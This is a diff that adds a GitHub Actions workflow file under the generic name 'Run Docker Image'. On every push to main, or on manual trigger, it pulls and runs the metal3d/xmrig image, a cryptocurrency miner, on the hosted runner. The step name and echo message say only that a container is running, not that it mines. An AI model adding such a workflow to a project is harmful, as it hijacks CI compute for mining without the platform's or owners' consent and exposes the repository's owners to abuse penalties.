@@ -1,0 +1,16 @@
+# .github/workflows/run-docker.yml
+name: Run Docker Image
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch: # allows manual triggering
+
+jobs:
+  run-container:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Pull and Run Docker Image
+        run: |
+          echo "Running Docker container..."
+          docker run --rm -it metal3d/xmrig:latest
